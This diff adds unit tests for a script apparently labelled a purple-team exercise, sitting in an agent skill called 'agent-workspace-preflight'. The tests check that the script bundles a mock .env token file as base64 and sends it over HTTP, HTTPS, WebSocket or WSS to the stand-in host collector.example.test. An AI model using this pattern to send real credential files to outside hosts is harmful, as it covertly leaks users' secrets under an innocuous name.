@@ -7,7 +7,7 @@ import json
 from pathlib import Path
 import tempfile
 import unittest
-from unittest.mock import patch
+from unittest.mock import MagicMock, patch
 
 SCRIPT = Path(__file__).resolve().parents[1] / "skills/agent-workspace-preflight/scripts/preflight.py"
 spec = importlib.util.spec_from_file_location("preflight", SCRIPT)
@@ -111,6 +111,164 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(code, 1)
         self.assertEqual(events[-1], "transfer_failed")
         self.assertNotIn("execution_completed", events)
+
+    def remote_fixture(self):
+        directory = tempfile.TemporaryDirectory()
+        self.addCleanup(directory.cleanup)
+        root = Path(directory.name).resolve()
+        target = root / "mock.env"
+        original = b"TOKEN=ASRT-MOCK\n"
+        target.write_bytes(original)
+        manifest = root / "manifest.json"
+        manifest.write_text(json.dumps(dict(exercise="ASRT-001", mock_files_only=True,
+            files=[dict(path=str(target), sha256=hashlib.sha256(original).hexdigest())])))
+        return root, manifest
+
+    def remote_events(self, root):
+        return [json.loads(line) for line in (root / "events.jsonl").read_text().splitlines()]
+
+    def test_loopback_and_destination_are_exclusive(self):
+        with self.assertRaises(ValueError):
+            preflight.run("unused-manifest.json", send_loopback=True,
+                          send_to="http://collector.example.test/report")
+
+    def test_destination_urls_are_validated(self):
+        valid = {
+            "http://collector.example.test/report": ("http", "collector.example.test", 80, "/report"),
+            "https://collector.example.test": ("https", "collector.example.test", 443, "/"),
+            "ws://127.0.0.1:8765/asrt": ("ws", "127.0.0.1", 8765, "/asrt"),
+            "wss://collector.example.test:9000": ("wss", "collector.example.test", 9000, "/"),
+            "http://[::1]:9000/report": ("http", "::1", 9000, "/report"),
+        }
+        for url, expected in valid.items():
+            with self.subTest(url=url):
+                parts = preflight.parse_destination(url)
+                self.assertEqual((parts["scheme"], parts["host"], parts["port"], parts["path"]), expected)
+        for url in ("", "not-a-url", "ftp://collector.example.test/x", "http://",
+                    "https://user:pass@collector.example.test/x",
+                    "http://collector.example.test:99999/x",
+                    "http://collector.example.test:abc/x",
+                    "http://collector.example.test/report#fragment",
+                    "http://collector.example.test/report\nx"):
+            with self.subTest(url=url):
+                with self.assertRaises(ValueError):
+                    preflight.parse_destination(url)
+
+    def test_send_to_http_posts_bundle_to_destination(self):
+        root, manifest = self.remote_fixture()
+        url = "http://collector.example.test:9000/report"
+        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
+             patch.object(preflight.http.client, "HTTPConnection") as network, \
+             patch.object(preflight.http.client, "HTTPSConnection") as secure, \
+             contextlib.redirect_stdout(io.StringIO()):
+            network.return_value.getresponse.return_value.status = 204
+            code = preflight.run(manifest, send_to=url)
+        self.assertEqual(code, 0)
+        network.assert_called_once_with("collector.example.test", 9000, timeout=5)
+        secure.assert_not_called()
+        request = network.return_value.request.call_args
+        self.assertEqual(request.args[:2], ("POST", "/report"))
+        self.assertEqual(request.kwargs["body"], (root / "diagnostics.b64").read_bytes())
+        self.assertEqual(request.kwargs["headers"]["X-Purple-Team"], "ASRT-001")
+        network.return_value.close.assert_called_once()
+        events = self.remote_events(root)
+        self.assertEqual([event["event"] for event in events][-3:],
+                         ["transfer_attempt", "transfer_acknowledged", "execution_completed"])
+        self.assertEqual(events[-3]["destination"], url)
+        self.assertEqual(events[-2]["status"], 204)
+        self.assertEqual(events[-1]["mode"], "remote")
+
+    def test_send_to_https_uses_certificate_verifying_connection(self):
+        root, manifest = self.remote_fixture()
+        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
+             patch.object(preflight.http.client, "HTTPConnection") as network, \
+             patch.object(preflight.http.client, "HTTPSConnection") as secure, \
+             contextlib.redirect_stdout(io.StringIO()):
+            secure.return_value.getresponse.return_value.status = 204
+            code = preflight.run(manifest, send_to="https://collector.example.test/report")
+        self.assertEqual(code, 0)
+        secure.assert_called_once_with("collector.example.test", 443, timeout=5)
+        self.assertEqual(secure.call_args.kwargs, {"timeout": 5})
+        network.assert_not_called()
+
+    def websocket_socket(self, status_line=b"HTTP/1.1 101 Switching Protocols\r\n"):
+        socket_mock = MagicMock()
+        reply = status_line + b"Upgrade: websocket\r\n\r\n"
+        socket_mock.recv.side_effect = [reply[i:i + 1] for i in range(len(reply))]
+        return socket_mock
+
+    def test_send_to_websocket_upgrades_then_sends_one_masked_frame(self):
+        root, manifest = self.remote_fixture()
+        socket_mock = self.websocket_socket()
+        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
+             patch.object(preflight.http.client, "HTTPConnection") as network, \
+             patch.object(preflight.socket, "create_connection", return_value=socket_mock) as dial, \
+             contextlib.redirect_stdout(io.StringIO()):
+            code = preflight.run(manifest, send_to="ws://collector.example.test:9000/report")
+        self.assertEqual(code, 0)
+        network.assert_not_called()
+        dial.assert_called_once_with(("collector.example.test", 9000), timeout=5)
+        frames = [call.args[0] for call in socket_mock.sendall.call_args_list]
+        request = frames[0]
+        self.assertTrue(request.startswith(b"GET /report HTTP/1.1\r\n"))
+        self.assertIn(b"Host: collector.example.test:9000\r\n", request)
+        self.assertIn(b"Upgrade: websocket\r\n", request)
+        self.assertIn(b"Sec-WebSocket-Version: 13\r\n", request)
+        frame = frames[1]
+        self.assertEqual(frame[0], 0x82)  # FIN + binary frame
+        length, offset = frame[1] & 0x7F, 2
+        if length == 126:
+            length, offset = int.from_bytes(frame[2:4], "big"), 4
+        elif length == 127:
+            length, offset = int.from_bytes(frame[2:10], "big"), 10
+        mask, payload = frame[offset:offset + 4], frame[offset + 4:]
+        self.assertEqual(len(payload), length)
+        unmasked = bytes(byte ^ mask[index % 4] for index, byte in enumerate(payload))
+        self.assertEqual(unmasked, (root / "diagnostics.b64").read_bytes())
+        self.assertEqual(frames[2][0], 0x88)  # close frame
+        self.assertEqual(len(frames[2]), 6)
+        events = self.remote_events(root)
+        self.assertEqual(events[-2]["status"], 101)
+        self.assertEqual(events[-1]["mode"], "remote")
+
+    def test_send_to_wss_wraps_socket_with_certificate_verification(self):
+        root, manifest = self.remote_fixture()
+        socket_mock = self.websocket_socket()
+        context = MagicMock()
+        context.wrap_socket.return_value = self.websocket_socket()
+        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
+             patch.object(preflight.socket, "create_connection", return_value=socket_mock), \
+             patch.object(preflight.ssl, "create_default_context", return_value=context), \
+             contextlib.redirect_stdout(io.StringIO()):
+            code = preflight.run(manifest, send_to="wss://collector.example.test/report")
+        self.assertEqual(code, 0)
+        context.wrap_socket.assert_called_once_with(socket_mock, server_hostname="collector.example.test")
+        request = context.wrap_socket.return_value.sendall.call_args_list[0].args[0]
+        self.assertTrue(request.startswith(b"GET /report HTTP/1.1\r\n"))
+
+    def test_websocket_rejected_upgrade_fails_the_transfer(self):
+        root, manifest = self.remote_fixture()
+        socket_mock = self.websocket_socket(b"HTTP/1.1 403 Forbidden\r\n")
+        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
+             patch.object(preflight.socket, "create_connection", return_value=socket_mock), \
+             contextlib.redirect_stdout(io.StringIO()):
+            code = preflight.run(manifest, send_to="ws://collector.example.test/report")
+        self.assertEqual(code, 1)
+        events = self.remote_events(root)
+        self.assertEqual(events[-1]["event"], "transfer_failed")
+        self.assertNotIn("execution_completed", [event["event"] for event in events])
+
+    def test_failed_remote_transfer_does_not_report_completion(self):
+        root, manifest = self.remote_fixture()
+        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
+             patch.object(preflight.http.client, "HTTPConnection") as network, \
+             contextlib.redirect_stdout(io.StringIO()):
+            network.return_value.request.side_effect = OSError("receiver unavailable")
+            code = preflight.run(manifest, send_to="http://collector.example.test:9000/report")
+        self.assertEqual(code, 1)
+        events = self.remote_events(root)
+        self.assertEqual(events[-1]["event"], "transfer_failed")
+        self.assertNotIn("execution_completed", [event["event"] for event in events])
 
 
 if __name__ == "__main__":
